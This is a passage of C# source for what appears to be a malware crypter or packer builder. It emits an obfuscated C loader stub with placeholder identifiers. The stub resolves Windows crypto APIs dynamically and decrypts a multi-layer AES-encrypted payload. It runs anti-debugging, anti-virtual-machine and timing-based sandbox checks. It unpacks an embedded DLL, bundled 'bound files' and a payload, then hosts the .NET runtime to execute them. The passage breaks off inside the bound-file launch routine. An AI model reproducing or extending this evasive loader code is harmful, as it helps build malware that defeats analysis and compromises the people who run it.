            sb.AppendLine("    __VAR_pBCryptSetProp__ = (__FN_BCryptSetProperty_t__)__VAR_pGetProcAddress__(__VAR_hBc__, \"BCryptSetProperty\");");
            sb.AppendLine("    __VAR_pBCryptGenKey__ = (__FN_BCryptGenerateSymmetricKey_t__)__VAR_pGetProcAddress__(__VAR_hBc__, \"BCryptGenerateSymmetricKey\");");
            sb.AppendLine("    __VAR_pBCryptDecrypt__ = (__FN_BCryptDecrypt_t__)__VAR_pGetProcAddress__(__VAR_hBc__, \"BCryptDecrypt\");");
            sb.AppendLine("    __VAR_pBCryptDestroyKey__ = (__FN_BCryptDestroyKey_t__)__VAR_pGetProcAddress__(__VAR_hBc__, \"BCryptDestroyKey\");");
            sb.AppendLine("    __VAR_pBCryptCloseAlg__ = (__FN_BCryptCloseAlgorithmProvider_t__)__VAR_pGetProcAddress__(__VAR_hBc__, \"BCryptCloseAlgorithmProvider\");");
            sb.AppendLine("    return __VAR_pBCryptOpenAlg__ && __VAR_pBCryptDecrypt__;");
            sb.AppendLine("}");
            sb.AppendLine();
            // AES-CBC decrypt: iv(16) || ciphertext || hmac(32) -> plaintext
            // Returns allocated buffer via VirtualAlloc, sets *outLen
            sb.AppendLine("static uint8_t* __FN_aes_cbc_decrypt__(const uint8_t* __VAR_key32__, const uint8_t* __VAR_data__, size_t __VAR_data_len__, size_t* __VAR_out_len__) {");
            sb.AppendLine("    if (__VAR_data_len__ < 16 + 32) return NULL;");
            sb.AppendLine("    const uint8_t* __VAR_iv__ = __VAR_data__;");
            sb.AppendLine("    size_t __VAR_ct_len__ = __VAR_data_len__ - 16 - 32;");
            sb.AppendLine("    const uint8_t* __VAR_ct__ = __VAR_data__ + 16;");
            sb.AppendLine();
            sb.AppendLine("    /* AES algorithm name as wide string: L\"AES\" */");
            sb.AppendLine("    WCHAR __VAR_wAES__[] = { 'A', 'E', 'S', 0 };");
            sb.AppendLine("    WCHAR __VAR_wCBC__[] = { 'C','h','a','i','n','i','n','g','M','o','d','e','C','B','C', 0 };");
            sb.AppendLine("    WCHAR __VAR_wChain__[] = { 'C','h','a','i','n','i','n','g','M','o','d','e', 0 };");
            sb.AppendLine();
            sb.AppendLine("    void* __VAR_hAlg__ = NULL;");
            sb.AppendLine("    long __VAR_status__ = __VAR_pBCryptOpenAlg__(&__VAR_hAlg__, __VAR_wAES__, NULL, 0);");
            sb.AppendLine("    if (__VAR_status__ != 0 || !__VAR_hAlg__) return NULL;");
            sb.AppendLine();
            sb.AppendLine("    __VAR_pBCryptSetProp__(__VAR_hAlg__, __VAR_wChain__, (BYTE*)__VAR_wCBC__, sizeof(__VAR_wCBC__), 0);");
            sb.AppendLine();
            sb.AppendLine("    void* __VAR_hKey__ = NULL;");
            sb.AppendLine("    __VAR_status__ = __VAR_pBCryptGenKey__(__VAR_hAlg__, &__VAR_hKey__, NULL, 0, (BYTE*)__VAR_key32__, 32, 0);");
            sb.AppendLine("    if (__VAR_status__ != 0 || !__VAR_hKey__) { __VAR_pBCryptCloseAlg__(__VAR_hAlg__, 0); return NULL; }");
            sb.AppendLine();
            sb.AppendLine("    /* Copy IV since BCrypt modifies it in-place */");
            sb.AppendLine("    uint8_t __VAR_iv_copy__[16];");
            sb.AppendLine("    memcpy(__VAR_iv_copy__, __VAR_iv__, 16);");
            sb.AppendLine();
            sb.AppendLine("    /* First call to get output size */");
            sb.AppendLine("    DWORD __VAR_pt_len__ = 0;");
            sb.AppendLine("    __VAR_pBCryptDecrypt__(__VAR_hKey__, (BYTE*)__VAR_ct__, (DWORD)__VAR_ct_len__, NULL, __VAR_iv_copy__, 16, NULL, 0, &__VAR_pt_len__, 1);");
            sb.AppendLine();
            sb.AppendLine("    uint8_t* __VAR_pt__ = (uint8_t*)__VAR_pVirtualAlloc__(NULL, __VAR_pt_len__ + 16, 0x3000, 0x04);");
            sb.AppendLine("    if (!__VAR_pt__) { __VAR_pBCryptDestroyKey__(__VAR_hKey__); __VAR_pBCryptCloseAlg__(__VAR_hAlg__, 0); return NULL; }");
            sb.AppendLine();
            sb.AppendLine("    /* Re-copy IV (it was modified) */");
            sb.AppendLine("    memcpy(__VAR_iv_copy__, __VAR_iv__, 16);");
            sb.AppendLine("    __VAR_status__ = __VAR_pBCryptDecrypt__(__VAR_hKey__, (BYTE*)__VAR_ct__, (DWORD)__VAR_ct_len__, NULL, __VAR_iv_copy__, 16, __VAR_pt__, __VAR_pt_len__ + 16, &__VAR_pt_len__, 1);");
            sb.AppendLine();
            sb.AppendLine("    __VAR_pBCryptDestroyKey__(__VAR_hKey__);");
            sb.AppendLine("    __VAR_pBCryptCloseAlg__(__VAR_hAlg__, 0);");
            sb.AppendLine();
            sb.AppendLine("    if (__VAR_status__ != 0) { __VAR_pVirtualFree__(__VAR_pt__, 0, 0x8000); return NULL; }");
            sb.AppendLine("    *__VAR_out_len__ = __VAR_pt_len__;");
            sb.AppendLine("    return __VAR_pt__;");
            sb.AppendLine("}");
            sb.AppendLine();
        }

        private static void EmitAntiDebug(StringBuilder sb)
        {
            sb.AppendLine("/* ---- Anti-debug checks ---- */");
            sb.AppendLine("static int __FN_check_debugger__(void) {");
            sb.AppendLine("    if (__VAR_pIsDebuggerPresent__ && __VAR_pIsDebuggerPresent__()) return 1;");
            sb.AppendLine("    if (__VAR_pCheckRemoteDebuggerPresent__ && __VAR_pGetCurrentProcess__) {");
            sb.AppendLine("        BOOL __VAR_dbg__ = FALSE;");
            sb.AppendLine("        __VAR_pCheckRemoteDebuggerPresent__(__VAR_pGetCurrentProcess__(), &__VAR_dbg__);");
            sb.AppendLine("        if (__VAR_dbg__) return 1;");
            sb.AppendLine("    }");
            sb.AppendLine("    if (__VAR_pOutputDebugStringA__ && __VAR_pGetLastError__) {");
            sb.AppendLine("        __VAR_pOutputDebugStringA__(__STR_open__);");
            sb.AppendLine("        if (__VAR_pGetLastError__() == 0) return 1;");
            sb.AppendLine("    }");
            sb.AppendLine("    return 0;");
            sb.AppendLine("}");
            sb.AppendLine();
        }

        private static void EmitAntiVM(StringBuilder sb)
        {
            sb.AppendLine("/* ---- Anti-VM checks ---- */");
            sb.AppendLine("static char __STR_vmware__[]  = \"vmware\";");
            sb.AppendLine("static char __STR_virtualbox__[] = \"virtualbox\";");
            sb.AppendLine("static char __STR_vbox__[]    = \"vbox\";");
            sb.AppendLine("static char __STR_qemu__[]    = \"qemu\";");
            sb.AppendLine("static char __STR_xen__[]     = \"xen\";");
            sb.AppendLine("static char __STR_parallels__[] = \"parallels\";");
            sb.AppendLine("static char __STR_sys_bios__[] = \"HARDWARE\\\\DESCRIPTION\\\\System\\\\BIOS\";");
            sb.AppendLine("static char __STR_sysmanuf__[] = \"SystemManufacturer\";");
            sb.AppendLine();

            sb.AppendLine("static int __FN_tolower_char__(int __VAR_ch__) {");
            sb.AppendLine("    return (__VAR_ch__ >= 'A' && __VAR_ch__ <= 'Z') ? __VAR_ch__ + 32 : __VAR_ch__;");
            sb.AppendLine("}");
            sb.AppendLine();

            sb.AppendLine("static int __FN_stristr__(const char* __VAR_hay__, const char* __VAR_needle__) {");
            sb.AppendLine("    if (!__VAR_hay__ || !__VAR_needle__) return 0;");
            sb.AppendLine("    for (const char* __VAR_p__=__VAR_hay__; *__VAR_p__; __VAR_p__++) {");
            sb.AppendLine("        const char* __VAR_a__=__VAR_p__, *__VAR_b__=__VAR_needle__;");
            sb.AppendLine("        while (*__VAR_a__ && *__VAR_b__ && __FN_tolower_char__(*__VAR_a__)==__FN_tolower_char__(*__VAR_b__)) { __VAR_a__++; __VAR_b__++; }");
            sb.AppendLine("        if (!*__VAR_b__) return 1;");
            sb.AppendLine("    }");
            sb.AppendLine("    return 0;");
            sb.AppendLine("}");
            sb.AppendLine();

            sb.AppendLine("static int __FN_check_vm__(void) {");
            sb.AppendLine("    /* Check registry for VM manufacturer strings */");
            sb.AppendLine("    if (__VAR_pRegOpenKeyExA__) {");
            sb.AppendLine("        HANDLE __VAR_hKey__ = NULL;");
            sb.AppendLine("        LONG __VAR_res__ = __VAR_pRegOpenKeyExA__((HANDLE)(intptr_t)0x80000002, __STR_sys_bios__, 0, 0x20019, &__VAR_hKey__);");
            sb.AppendLine("        if (__VAR_res__ == 0 && __VAR_hKey__) {");
            sb.AppendLine("            char __VAR_val__[256];");
            sb.AppendLine("            DWORD __VAR_vlen__ = 255;");
            sb.AppendLine("            DWORD __VAR_type__ = 0;");
            sb.AppendLine("            __VAR_res__ = __VAR_pRegQueryValueExA__(__VAR_hKey__, __STR_sysmanuf__, NULL, &__VAR_type__, (BYTE*)__VAR_val__, &__VAR_vlen__);");
            sb.AppendLine("            if (__VAR_res__ == 0) {");
            sb.AppendLine("                __VAR_val__[__VAR_vlen__] = 0;");
            sb.AppendLine("                if (__FN_stristr__(__VAR_val__, __STR_vmware__) || __FN_stristr__(__VAR_val__, __STR_virtualbox__) ||");
            sb.AppendLine("                    __FN_stristr__(__VAR_val__, __STR_vbox__) || __FN_stristr__(__VAR_val__, __STR_qemu__) ||");
            sb.AppendLine("                    __FN_stristr__(__VAR_val__, __STR_xen__) || __FN_stristr__(__VAR_val__, __STR_parallels__)) {");
            sb.AppendLine("                    __VAR_pRegCloseKey__(__VAR_hKey__);");
            sb.AppendLine("                    return 1;");
            sb.AppendLine("                }");
            sb.AppendLine("            }");
            sb.AppendLine("            __VAR_pRegCloseKey__(__VAR_hKey__);");
            sb.AppendLine("        }");
            sb.AppendLine("    }");
            sb.AppendLine();
            sb.AppendLine("    /* Check physical memory (sandboxes typically have <2GB) */");
            sb.AppendLine("    if (__VAR_pGlobalMemoryStatusEx__) {");
            sb.AppendLine("        uint8_t __VAR_meminfo__[64];");
            sb.AppendLine("        memset(__VAR_meminfo__, 0, 64);");
            sb.AppendLine("        *(DWORD*)__VAR_meminfo__ = 64;");
            sb.AppendLine("        if (__VAR_pGlobalMemoryStatusEx__(__VAR_meminfo__)) {");
            sb.AppendLine("            uint64_t __VAR_totalphys__ = *(uint64_t*)(__VAR_meminfo__+8);");
            sb.AppendLine("            if (__VAR_totalphys__ < (uint64_t)2 * 1024 * 1024 * 1024) return 1;");
            sb.AppendLine("        }");
            sb.AppendLine("    }");
            sb.AppendLine();
            sb.AppendLine("    /* Check processor count */");
            sb.AppendLine("    if (__VAR_pGetSystemInfo__) {");
            sb.AppendLine("        uint8_t __VAR_sysinfo__[64];");
            sb.AppendLine("        memset(__VAR_sysinfo__, 0, 64);");
            sb.AppendLine("        __VAR_pGetSystemInfo__(__VAR_sysinfo__);");
            sb.AppendLine("        DWORD __VAR_numproc__ = *(DWORD*)(__VAR_sysinfo__+32);");
            sb.AppendLine("        if (__VAR_numproc__ < 2) return 1;");
            sb.AppendLine("    }");
            sb.AppendLine();
            sb.AppendLine("    return 0;");
            sb.AppendLine("}");
            sb.AppendLine();
        }

        private static void EmitTimingCheck(StringBuilder sb)
        {
            sb.AppendLine("/* ---- Timing-based sandbox detection ---- */");
            sb.AppendLine("static int __FN_check_timing__(void) {");
            sb.AppendLine("    if (!__VAR_pGetTickCount__ || !__VAR_pSleep__) return 0;");
            sb.AppendLine("    DWORD __VAR_t1__ = __VAR_pGetTickCount__();");
            sb.AppendLine("    __VAR_pSleep__(500);");
            sb.AppendLine("    DWORD __VAR_t2__ = __VAR_pGetTickCount__();");
            sb.AppendLine("    DWORD __VAR_elapsed__ = __VAR_t2__ - __VAR_t1__;");
            sb.AppendLine("    if (__VAR_elapsed__ < 450) return 1;");
            sb.AppendLine("    return 0;");
            sb.AppendLine("}");
            sb.AppendLine();
        }

        private static void EmitDecryptPayload(StringBuilder sb)
        {
            sb.AppendLine("/* ---- Payload decryption (Layer 1 then Layer 2) ---- */");
            sb.AppendLine("/*");
            sb.AppendLine("   Layer 1 blob: IV(16) || AES-CBC ciphertext || HMAC(32)");
            sb.AppendLine("   Layer 1 plaintext: [32-byte L2 key][16-byte L2 IV][L2 encrypted]");
            sb.AppendLine("   Layer 2 plaintext: [32 L3key][16 L3iv][4 dllLen][dll]");
            sb.AppendLine("     [4 boundFileCount][NameLen(4)|Name|DataLen(4)|Data|Action(1)]xN");
            sb.AppendLine("     [4 payloadLen][payload]");
            sb.AppendLine("*/");
            sb.AppendLine();

            sb.AppendLine("static uint32_t __FN_read_u32_le__(const uint8_t* __VAR_p__) {");
            sb.AppendLine("    return (uint32_t)__VAR_p__[0] | ((uint32_t)__VAR_p__[1]<<8) | ((uint32_t)__VAR_p__[2]<<16) | ((uint32_t)__VAR_p__[3]<<24);");
            sb.AppendLine("}");
            sb.AppendLine();

            // Bound file struct
            sb.AppendLine("typedef struct {");
            sb.AppendLine("    char*    __VAR_name__;");
            sb.AppendLine("    uint32_t __VAR_name_len__;");
            sb.AppendLine("    uint8_t* __VAR_data__;");
            sb.AppendLine("    uint32_t __VAR_data_len__;");
            sb.AppendLine("    uint8_t  __VAR_action__;");
            sb.AppendLine("} __FN_bound_file__;");
            sb.AppendLine();

            sb.AppendLine("#define __VAR_MAX_BOUND_FILES__ 32");
            sb.AppendLine();

            sb.AppendLine("typedef struct {");
            sb.AppendLine("    uint8_t* __VAR_l3_key__;");
            sb.AppendLine("    uint8_t* __VAR_l3_iv__;");
            sb.AppendLine("    uint8_t* __VAR_dll_data__;");
            sb.AppendLine("    uint32_t __VAR_dll_len__;");
            sb.AppendLine("    uint8_t* __VAR_payload_data__;");
            sb.AppendLine("    uint32_t __VAR_payload_len__;");
            sb.AppendLine("    __FN_bound_file__ __VAR_bound_files__[__VAR_MAX_BOUND_FILES__];");
            sb.AppendLine("    uint32_t __VAR_bound_file_count__;");
            sb.AppendLine("} __FN_unpacked_result__;");
            sb.AppendLine();

            sb.AppendLine("static uint8_t* __VAR_alloc_buf__ = NULL;");
            sb.AppendLine("static uint8_t* __VAR_alloc_buf2__ = NULL;");
            sb.AppendLine();

            sb.AppendLine("static int __FN_decrypt_and_unpack__(const uint8_t* __VAR_key_l1__, __FN_unpacked_result__* __VAR_result__) {");
            sb.AppendLine();
            sb.AppendLine("    if (!__FN_init_bcrypt__()) return 0;");
            sb.AppendLine();
            sb.AppendLine("    /* L1 blob format: IV(16) || AES-CBC ciphertext || HMAC(32) */");
            sb.AppendLine("    size_t __VAR_l1_pt_len__ = 0;");
            sb.AppendLine("    __VAR_alloc_buf__ = __FN_aes_cbc_decrypt__(__VAR_key_l1__, __DATA_blob__, (size_t)__DATA_blob_len__, &__VAR_l1_pt_len__);");
            sb.AppendLine("    if (!__VAR_alloc_buf__) return 0;");
            sb.AppendLine();
            sb.AppendLine("    /* L1 plaintext: [32 L2key][16 L2iv][L2 encrypted (IV+ct+HMAC)] */");
            sb.AppendLine("    const uint8_t* __VAR_l2_key__  = __VAR_alloc_buf__;");
            sb.AppendLine("    const uint8_t* __VAR_l2_iv__   = __VAR_alloc_buf__ + 32;");
            sb.AppendLine("    const uint8_t* __VAR_l2_blob__ = __VAR_alloc_buf__ + 48;");
            sb.AppendLine("    size_t __VAR_l2_blob_len__ = __VAR_l1_pt_len__ - 48;");
            sb.AppendLine();
            sb.AppendLine("    /* L2 decrypt */");
            sb.AppendLine("    size_t __VAR_l2_pt_len__ = 0;");
            sb.AppendLine("    __VAR_alloc_buf2__ = __FN_aes_cbc_decrypt__(__VAR_l2_key__, __VAR_l2_blob__, __VAR_l2_blob_len__, &__VAR_l2_pt_len__);");
            sb.AppendLine("    if (!__VAR_alloc_buf2__) return 0;");
            sb.AppendLine();
            sb.AppendLine("    /* Parse L2 plaintext: [32 L3key][16 L3iv][4 dllLen][dll][4 boundCount][bounds...][4 payloadLen][payload] */");
            sb.AppendLine("    const uint8_t* __VAR_ptr__ = __VAR_alloc_buf2__;");
            sb.AppendLine("    __VAR_result__->__VAR_l3_key__ = (uint8_t*)__VAR_ptr__; __VAR_ptr__ += 32;");
            sb.AppendLine("    __VAR_result__->__VAR_l3_iv__  = (uint8_t*)__VAR_ptr__; __VAR_ptr__ += 16;");
            sb.AppendLine();
            sb.AppendLine("    __VAR_result__->__VAR_dll_len__ = __FN_read_u32_le__(__VAR_ptr__); __VAR_ptr__ += 4;");
            sb.AppendLine("    __VAR_result__->__VAR_dll_data__ = (uint8_t*)__VAR_ptr__; __VAR_ptr__ += __VAR_result__->__VAR_dll_len__;");
            sb.AppendLine();
            sb.AppendLine("    /* Bound files: count(4) then [nameLen(4)|name|dataLen(4)|data|action(1)] x N */");
            sb.AppendLine("    __VAR_result__->__VAR_bound_file_count__ = __FN_read_u32_le__(__VAR_ptr__); __VAR_ptr__ += 4;");
            sb.AppendLine("    if (__VAR_result__->__VAR_bound_file_count__ > __VAR_MAX_BOUND_FILES__)");
            sb.AppendLine("        __VAR_result__->__VAR_bound_file_count__ = __VAR_MAX_BOUND_FILES__;");
            sb.AppendLine();
            sb.AppendLine("    for (uint32_t __VAR_i__ = 0; __VAR_i__ < __VAR_result__->__VAR_bound_file_count__; __VAR_i__++) {");
            sb.AppendLine("        uint32_t __VAR_nlen__ = __FN_read_u32_le__(__VAR_ptr__); __VAR_ptr__ += 4;");
            sb.AppendLine("        __VAR_result__->__VAR_bound_files__[__VAR_i__].__VAR_name__ = (char*)__VAR_ptr__;");
            sb.AppendLine("        __VAR_result__->__VAR_bound_files__[__VAR_i__].__VAR_name_len__ = __VAR_nlen__;");
            sb.AppendLine("        __VAR_ptr__ += __VAR_nlen__;");
            sb.AppendLine("        uint32_t __VAR_dlen__ = __FN_read_u32_le__(__VAR_ptr__); __VAR_ptr__ += 4;");
            sb.AppendLine("        __VAR_result__->__VAR_bound_files__[__VAR_i__].__VAR_data__ = (uint8_t*)__VAR_ptr__;");
            sb.AppendLine("        __VAR_result__->__VAR_bound_files__[__VAR_i__].__VAR_data_len__ = __VAR_dlen__;");
            sb.AppendLine("        __VAR_ptr__ += __VAR_dlen__;");
            sb.AppendLine("        __VAR_result__->__VAR_bound_files__[__VAR_i__].__VAR_action__ = *__VAR_ptr__; __VAR_ptr__ += 1;");
            sb.AppendLine("    }");
            sb.AppendLine();
            sb.AppendLine("    /* Remaining: [4 payloadLen][payload] */");
            sb.AppendLine("    __VAR_result__->__VAR_payload_len__ = __FN_read_u32_le__(__VAR_ptr__); __VAR_ptr__ += 4;");
            sb.AppendLine("    __VAR_result__->__VAR_payload_data__ = (uint8_t*)__VAR_ptr__;");
            sb.AppendLine();
            sb.AppendLine("    return 1;");
            sb.AppendLine("}");
            sb.AppendLine();
        }

        private static void EmitClrHosting(StringBuilder sb)
        {
            sb.AppendLine("/* ---- CLR Hosting via COM ---- */");
            sb.AppendLine("static const CLSID __VAR_CLSID_CLRMetaHost__ = { 0x9280188D, 0x0E8E, 0x4867, {0xB3,0x0C,0x7F,0xA8,0x38,0x84,0xE8,0xDE} };");
            sb.AppendLine("static const IID __VAR_IID_ICLRMetaHost__    = { 0xD332DB9E, 0xB9B3, 0x4125, {0x82,0x07,0xA1,0x48,0x84,0xF5,0x32,0x16} };");
            sb.AppendLine("static const IID __VAR_IID_ICLRRuntimeInfo__ = { 0xBD39D1D2, 0xBA2F, 0x486A, {0x89,0xB0,0xB4,0xB0,0xCB,0x46,0x68,0x91} };");
            sb.AppendLine("static const IID __VAR_IID_ICLRRuntimeHost__ = { 0x90F1A06C, 0x7712, 0x4762, {0x86,0xB5,0x7A,0x5E,0xBA,0x6B,0xDB,0x02} };");
            sb.AppendLine();

            sb.AppendLine("typedef struct { void** __VAR_vtbl__; } __FN_ICLRMetaHost__;");
            sb.AppendLine("typedef struct { void** __VAR_vtbl__; } __FN_ICLRRuntimeInfo__;");
            sb.AppendLine("typedef struct { void** __VAR_vtbl__; } __FN_ICLRRuntimeHost__;");
            sb.AppendLine();

            sb.AppendLine("/* vtable indices (IUnknown: 0=QI, 1=AddRef, 2=Release) */");
            sb.AppendLine("#define __VAR_METAHOST_GETRUNTIME__ 3");
            sb.AppendLine("#define __VAR_RUNTIMEINFO_GETINTERFACE__ 9");
            sb.AppendLine("#define __VAR_RUNTIMEHOST_START__ 3");
            sb.AppendLine("#define __VAR_RUNTIMEHOST_EXECUTEINDOMAIN__ 11");
            sb.AppendLine();

            sb.AppendLine("static int __FN_widen__(const char* __VAR_src__, WCHAR* __VAR_dst__, int __VAR_max__) {");
            sb.AppendLine("    int __VAR_i__ = 0;");
            sb.AppendLine("    while (__VAR_src__[__VAR_i__] && __VAR_i__ < __VAR_max__-1) {");
            sb.AppendLine("        __VAR_dst__[__VAR_i__] = (WCHAR)__VAR_src__[__VAR_i__];");
            sb.AppendLine("        __VAR_i__++;");
            sb.AppendLine("    }");
            sb.AppendLine("    __VAR_dst__[__VAR_i__] = 0;");
            sb.AppendLine("    return __VAR_i__;");
            sb.AppendLine("}");
            sb.AppendLine();

            sb.AppendLine("static int __FN_write_file_to_disk__(const char* __VAR_path__, const uint8_t* __VAR_data__, uint32_t __VAR_len__) {");
            sb.AppendLine("    HANDLE __VAR_hf__ = __VAR_pCreateFileA__(__VAR_path__, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);");
            sb.AppendLine("    if (__VAR_hf__ == INVALID_HANDLE_VALUE) return 0;");
            sb.AppendLine("    DWORD __VAR_written__ = 0;");
            sb.AppendLine("    BOOL __VAR_ok__ = __VAR_pWriteFile__(__VAR_hf__, __VAR_data__, __VAR_len__, &__VAR_written__, NULL);");
            sb.AppendLine("    __VAR_pCloseHandle__(__VAR_hf__);");
            sb.AppendLine("    return __VAR_ok__ && __VAR_written__ == __VAR_len__;");
            sb.AppendLine("}");
            sb.AppendLine();

            sb.AppendLine("static void __FN_strcat_safe__(char* __VAR_dst__, const char* __VAR_src__, int __VAR_max__) {");
            sb.AppendLine("    int __VAR_dl__ = 0;");
            sb.AppendLine("    while (__VAR_dst__[__VAR_dl__]) __VAR_dl__++;");
            sb.AppendLine("    int __VAR_i__ = 0;");
            sb.AppendLine("    while (__VAR_src__[__VAR_i__] && __VAR_dl__ + __VAR_i__ < __VAR_max__-1) {");
            sb.AppendLine("        __VAR_dst__[__VAR_dl__+__VAR_i__] = __VAR_src__[__VAR_i__];");
            sb.AppendLine("        __VAR_i__++;");
            sb.AppendLine("    }");
            sb.AppendLine("    __VAR_dst__[__VAR_dl__+__VAR_i__] = 0;");
            sb.AppendLine("}");
            sb.AppendLine();

            sb.AppendLine("static uint32_t __FN_simple_rng__(uint32_t __VAR_seed__) {");
            sb.AppendLine("    __VAR_seed__ ^= __VAR_seed__ << 13;");
            sb.AppendLine("    __VAR_seed__ ^= __VAR_seed__ >> 17;");
            sb.AppendLine("    __VAR_seed__ ^= __VAR_seed__ << 5;");
            sb.AppendLine("    return __VAR_seed__;");
            sb.AppendLine("}");
            sb.AppendLine();

            sb.AppendLine("static void __FN_bytes_to_hex__(const uint8_t* __VAR_src__, int __VAR_len__, char* __VAR_dst__) {");
            sb.AppendLine("    const char* __VAR_hex_chars__ = \"0123456789abcdef\";");
            sb.AppendLine("    for (int __VAR_i__ = 0; __VAR_i__ < __VAR_len__; __VAR_i__++) {");
            sb.AppendLine("        __VAR_dst__[__VAR_i__*2]   = __VAR_hex_chars__[__VAR_src__[__VAR_i__] >> 4];");
            sb.AppendLine("        __VAR_dst__[__VAR_i__*2+1] = __VAR_hex_chars__[__VAR_src__[__VAR_i__] & 0xF];");
            sb.AppendLine("    }");
            sb.AppendLine("    __VAR_dst__[__VAR_len__*2] = 0;");
            sb.AppendLine("}");
            sb.AppendLine();
            sb.AppendLine("static int __FN_host_clr__(const char* __VAR_dll_path__, const char* __VAR_payload_path__, const uint8_t* __VAR_l3_key_bytes__) {");
            sb.AppendLine("    if (!__VAR_pCLRCreateInstance__) return 0;");
            sb.AppendLine();
            sb.AppendLine("    __FN_ICLRMetaHost__* __VAR_metaHost__ = NULL;");
            sb.AppendLine("    HRESULT __VAR_hr__ = __VAR_pCLRCreateInstance__(&__VAR_CLSID_CLRMetaHost__, &__VAR_IID_ICLRMetaHost__, (LPVOID*)&__VAR_metaHost__);");
            sb.AppendLine("    if (__VAR_hr__ != S_OK || !__VAR_metaHost__) return 0;");
            sb.AppendLine();
            sb.AppendLine("    WCHAR __VAR_wVersion__[32];");
            sb.AppendLine("    __FN_widen__(__STR_v4__, __VAR_wVersion__, 32);");
            sb.AppendLine();
            sb.AppendLine("    /* ICLRMetaHost::GetRuntime(pwzVersion, riid, ppRuntime) */");
            sb.AppendLine("    typedef HRESULT (__stdcall *__FN_GetRuntime_t__)(void*, LPCWSTR, const IID*, void**);");
            sb.AppendLine("    __FN_ICLRRuntimeInfo__* __VAR_runtimeInfo__ = NULL;");
            sb.AppendLine("    __FN_GetRuntime_t__ __VAR_fnGetRuntime__ = (__FN_GetRuntime_t__)__VAR_metaHost__->__VAR_vtbl__[__VAR_METAHOST_GETRUNTIME__];");
            sb.AppendLine("    __VAR_hr__ = __VAR_fnGetRuntime__(__VAR_metaHost__, __VAR_wVersion__, &__VAR_IID_ICLRRuntimeInfo__, (void**)&__VAR_runtimeInfo__);");
            sb.AppendLine("    if (__VAR_hr__ != S_OK || !__VAR_runtimeInfo__) return 0;");
            sb.AppendLine();
            sb.AppendLine("    /* ICLRRuntimeInfo::GetInterface(rclsid, riid, ppUnk) */");
            sb.AppendLine("    typedef HRESULT (__stdcall *__FN_GetInterface_t__)(void*, const CLSID*, const IID*, void**);");
            sb.AppendLine("    static const CLSID __VAR_CLSID_CLRRuntimeHost__ = { 0x90F1A06E, 0x7712, 0x4762, {0x86,0xB5,0x7A,0x5E,0xBA,0x6B,0xDB,0x02} };");
            sb.AppendLine("    __FN_ICLRRuntimeHost__* __VAR_runtimeHost__ = NULL;");
            sb.AppendLine("    __FN_GetInterface_t__ __VAR_fnGetInterface__ = (__FN_GetInterface_t__)__VAR_runtimeInfo__->__VAR_vtbl__[__VAR_RUNTIMEINFO_GETINTERFACE__];");
            sb.AppendLine("    __VAR_hr__ = __VAR_fnGetInterface__(__VAR_runtimeInfo__, &__VAR_CLSID_CLRRuntimeHost__, &__VAR_IID_ICLRRuntimeHost__, (void**)&__VAR_runtimeHost__);");
            sb.AppendLine("    if (__VAR_hr__ != S_OK || !__VAR_runtimeHost__) return 0;");
            sb.AppendLine();
            sb.AppendLine("    /* ICLRRuntimeHost::Start() */");
            sb.AppendLine("    typedef HRESULT (__stdcall *__FN_Start_t__)(void*);");
            sb.AppendLine("    __FN_Start_t__ __VAR_fnStart__ = (__FN_Start_t__)__VAR_runtimeHost__->__VAR_vtbl__[__VAR_RUNTIMEHOST_START__];");
            sb.AppendLine("    __VAR_fnStart__(__VAR_runtimeHost__);");
            sb.AppendLine();
            sb.AppendLine("    /* ICLRRuntimeHost::ExecuteInDefaultAppDomain(pwzAssemblyPath, pwzTypeName, pwzMethodName, pwzArgument, pReturnValue) */");
            sb.AppendLine("    typedef HRESULT (__stdcall *__FN_Execute_t__)(void*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, DWORD*);");
            sb.AppendLine("    __FN_Execute_t__ __VAR_fnExecute__ = (__FN_Execute_t__)__VAR_runtimeHost__->__VAR_vtbl__[__VAR_RUNTIMEHOST_EXECUTEINDOMAIN__];");
            sb.AppendLine();
            sb.AppendLine("    WCHAR __VAR_wDllPath__[MAX_PATH];");
            sb.AppendLine("    __FN_widen__(__VAR_dll_path__, __VAR_wDllPath__, MAX_PATH);");
            sb.AppendLine();
            sb.AppendLine("    WCHAR __VAR_wTypeName__[256];");
            sb.AppendLine("    __FN_widen__(__STR_entrytype__, __VAR_wTypeName__, 256);");
            sb.AppendLine();
            sb.AppendLine("    WCHAR __VAR_wMethodName__[64];");
            sb.AppendLine("    __FN_widen__(__STR_entrymethod__, __VAR_wMethodName__, 64);");
            sb.AppendLine();
            sb.AppendLine("    /* Build argument: hexkey|payloadpath */");
            sb.AppendLine("    char __VAR_hexKey__[65];");
            sb.AppendLine("    __FN_bytes_to_hex__(__VAR_l3_key_bytes__, 32, __VAR_hexKey__);");
            sb.AppendLine("    char __VAR_argStr__[MAX_PATH + 66];");
            sb.AppendLine("    memset(__VAR_argStr__, 0, sizeof(__VAR_argStr__));");
            sb.AppendLine("    memcpy(__VAR_argStr__, __VAR_hexKey__, 64);");
            sb.AppendLine("    __VAR_argStr__[64] = '|';");
            sb.AppendLine("    memcpy(__VAR_argStr__ + 65, __VAR_payload_path__, strlen(__VAR_payload_path__));");
            sb.AppendLine("    WCHAR __VAR_wArg__[MAX_PATH + 66];");
            sb.AppendLine("    __FN_widen__(__VAR_argStr__, __VAR_wArg__, MAX_PATH + 66);");
            sb.AppendLine();
            sb.AppendLine("    DWORD __VAR_retVal__ = 0;");
            sb.AppendLine("    __VAR_hr__ = __VAR_fnExecute__(__VAR_runtimeHost__, __VAR_wDllPath__, __VAR_wTypeName__, __VAR_wMethodName__, __VAR_wArg__, &__VAR_retVal__);");
            sb.AppendLine("    return __VAR_hr__ == S_OK;");
            sb.AppendLine("}");
            sb.AppendLine();
        }

        private static void EmitBoundFileLaunch(StringBuilder sb)
        {
            sb.AppendLine("/* ---- Bound file launch ---- */");
            sb.AppendLine("static void __FN_launch_bound_files__(const char* __VAR_temp_dir__, __FN_unpacked_result__* __VAR_res__) {");
            sb.AppendLine("    for (uint32_t __VAR_i__ = 0; __VAR_i__ < __VAR_res__->__VAR_bound_file_count__; __VAR_i__++) {");
            sb.AppendLine("        __FN_bound_file__* __VAR_bf__ = &__VAR_res__->__VAR_bound_files__[__VAR_i__];");
            sb.AppendLine("        if (!__VAR_bf__->__VAR_data__ || __VAR_bf__->__VAR_data_len__ == 0) continue;");
            sb.AppendLine();
            sb.AppendLine("        /* Build file path: temp_dir + name (null-terminated copy) */");
            sb.AppendLine("        char __VAR_name_buf__[MAX_PATH];");
